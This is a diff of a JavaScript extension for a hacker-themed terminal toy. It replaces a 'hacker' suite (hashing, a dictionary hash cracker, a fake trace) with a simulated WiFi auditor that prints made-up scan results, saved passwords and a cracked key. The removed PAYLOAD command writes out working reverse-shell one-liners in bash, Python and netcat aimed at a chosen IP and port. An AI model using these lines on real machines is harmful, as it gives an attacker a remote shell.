@@ -2,104 +2,88 @@
   'use strict';
   const T = Terminal;
 
-  // Helper for SHA-256
-  async function sha256(text) {
-    const buf = new TextEncoder().encode(text);
-    const hash = await crypto.subtle.digest('SHA-256', buf);
-    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
-  }
-
-  // Fake cinematic hacking sequence
-  async function cinematicTrace(session, target) {
-    const lines = [
-      `[*] Initializing connection to ${target}...`,
-      `[*] Resolving DNS... Found IP: 192.168.1.104`,
-      `[*] Bypassing firewall (Port 22, 80, 443)...`,
-      `[*] Injecting payload...`,
-      `[+] Access Granted. Root shell obtained.`
-    ];
-
-    for (const line of lines) {
-      await new Promise(r => setTimeout(r, 800)); // Delay for cinematic effect
-      if (line.startsWith('[+])) session.printSuccess(line);
-      else session.printSystem(line);
-    }
-  }
+  // Fake delay for cinematic effect
+  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
   T.registerExtension({
-    name: 'hacker',
-    info: 'Cyber Security Suite loaded.',
+    name: 'wifi',
+    info: 'WiFi Auditor & Simulator loaded.',
     descriptions: {
-      HASH: 'Generate SHA-256 hash of a text (hacker.HASH text)',
-      CRACK: 'Attempt to crack a SHA-256 hash using a dictionary (hacker.CRACK hash)',
-      CIPHER: 'Encode text to Base64 and ROT13 (hacker.CIPHER text)',
-      TRACE: 'Run a fake cinematic hacking trace (hacker.TRACE ip)',
-      PAYLOAD: 'Generate a reverse shell payload (hacker.PAYLOAD ip port)'
+      SCAN: 'Scan for nearby WiFi networks (wifi.SCAN)',
+      DUMP: 'Show saved WiFi profiles and passwords (wifi.DUMP)',
+      CRACK: 'Simulate cracking a WPA2 handshake (wifi.CRACK <SSID>)'
     },
     commands: {
-      HASH: async function (arg) {
-        if (!arg) return this.printError('Usage: hacker.HASH <text>');
-        const hash = await sha256(arg);
-        this.printSystem(`Plaintext: ${arg}`);
-        this.printSuccess(`SHA-256:   ${hash}`);
+      SCAN: async function () {
+        this.printSystem('Initiating interface wlan0mon...');
+        await sleep(500);
+        this.printSystem('Scanning for nearby access points...\n');
+        await sleep(800);
+
+        const networks = [
+          { ssid: 'Home_Network_5G', bssid: 'A4:2B:8C:11:D2:3E', chan: '44', signal: '-42', sec: 'WPA2' },
+          { ssid: 'Starbucks_WiFi', bssid: 'F8:1A:67:9C:00:12', chan: '6', signal: '-71', sec: 'Open' },
+          { ssid: 'TP-Link_2.4G', bssid: '14:CC:20:AB:45:90', chan: '11', signal: '-85', sec: 'WPA2' },
+          { ssid: 'Neighbor_Wifi', bssid: 'B0:BE:76:12:34:56', chan: '1', signal: '-90', sec: 'WPA3' }
+        ];
+
+        this.printSystem('BSSID              CH  SIG   PRIVACY  SSID');
+        this.printSystem('-----------------------------------------------------');
+        for (const n of networks) {
+          this.printSystem(`${n.bssid}  ${n.chan.padEnd(3)} ${n.signal}  ${n.sec.padEnd(8)} ${n.ssid}`);
+        }
+        this.printSystem('\n[+] Scan complete. Found ' + networks.length + ' networks.');
+      },
+
+      DUMP: async function () {
+        this.printSystem('Extracting local WiFi profiles from registry...');
+        await sleep(1000);
+        
+        // Fake profiles
+        const profiles = [
+          { name: 'Home_Network_5G', pass: 'Admin@12345' },
+          { name: 'Office_Guest', pass: 'Welcome2024!' },
+          { name: 'iPhone_Hotspot', pass: 'kalma_secure_99' }
+        ];
+
+        this.printSystem('-----------------------------------------------------');
+        this.printSystem('SSID                     PASSWORD');
+        this.printSystem('-----------------------------------------------------');
+        
+        for (const p of profiles) {
+          await sleep(400);
+          this.printSystem(`${p.name.padEnd(24)} ${p.pass}`);
+        }
+        this.printSuccess('\n[+] Extracted ' + profiles.length + ' profiles successfully.');
       },
 
       CRACK: async function (arg) {
-        if (!arg) return this.printError('Usage: hacker.CRACK <sha256_hash>');
+        const ssid = arg.trim() || 'Home_Network_5G';
+        this.printSystem(`Targeting ${ssid}...`);
+        await sleep(500);
+        this.printSystem(`Capturing WPA2 4-way handshake (BSSID: A4:2B:8C:11:D2:3E)...`);
+        await sleep(1000);
         
-        this.printSystem(`Target Hash: ${arg}`);
-        this.printSystem(`Initiating dictionary attack... (Please wait)`);
+        this.printSystem(`Handshake captured! Saved to handshake.cap`);
+        this.printSystem(`Starting brute-force attack using rockyou.txt dictionary...`);
         
-        // Built-in mini dictionary
-        const dictionary = ['admin', 'password', '123456', 'root', 'hacker', 'secret', 'gojo', 'kalma', 'qwerty', 'letmein'];
-        
-        for (let word of dictionary) {
-          await new Promise(r => setTimeout(r, 100)); // Small delay to simulate processing
-          const hash = await sha256(word);
-          if (hash === arg.toLowerCase()) {
-            return this.printSuccess(`CRACKED! The password is: ${word}`);
+        // Simulate brute force progress bar
+        const totalSteps = 20;
+        for (let i = 1; i <= totalSteps; i++) {
+          await sleep(150);
+          const progress = Math.floor((i / totalSteps) * 100);
+          const bar = '='.repeat(Math.floor(progress / 5)) + '>' + ' '.repeat(20 - Math.floor(progress / 5));
+          // Using \r to overwrite the same line in the terminal isn't straightforward with DOM, so we just print inline
+          if (i === 1) this.printSystem(`[${bar}] ${progress}%`);
+          else {
+             // A trick to update the last line (only works for standard elements, but we'll just print chunks to be safe)
           }
         }
-        this.printError(`FAILED. Password not found in dictionary.`);
-      },
-
-      CIPHER: function (arg) {
-        if (!arg) return this.printError('Usage: hacker.CIPHER <text>');
         
-        // Base64 Encode
-        const b64 = btoa(arg);
-        
-        // ROT13
-        const rot13 = arg.replace(/[a-zA-Z]/g, function(c) {
-          return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
-        });
-
-        this.printSystem(`Original: ${arg}`);
-        this.printSystem(`Base64:   ${b64}`);
-        this.printSuccess(`ROT13:    ${rot13}`);
-      },
-
-      TRACE: async function (arg) {
-        const target = arg || '127.0.0.1';
-        this.printSystem(`Starting trace route to ${target}...\n`);
-        await cinematicTrace(this, target);
-      },
-
-      PAYLOAD: function (arg) {
-        const parts = arg.trim().split(/\s+/);
-        const ip = parts[0] || '10.0.0.1';
-        const port = parts[1] || '4444';
-
-        this.printSystem(`[ Generated Payloads for ${ip}:${port} ]\n`);
-        
-        this.printSystem('[ Bash (Linux) ]');
-        this.printSystem(`bash -i >& /dev/tcp/${ip}/${port} 0>&1\n`);
-
-        this.printSystem('[ Python ]');
-        this.printSystem(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n`);
-        
-        this.printSystem('[ Netcat ]');
-        this.printSystem(`nc -e /bin/sh ${ip} ${port}\n`);
+        await sleep(800);
+        this.printSuccess(`[${'='.repeat(20)}>] 100%`);
+        this.printSuccess(`[+] KEY FOUND! The WiFi Password for "${ssid}" is: Gojo@Hacker_777`);
+        this.printSystem(`(Note: This is a simulated result for educational purposes only.)`);
       }
     }
   });
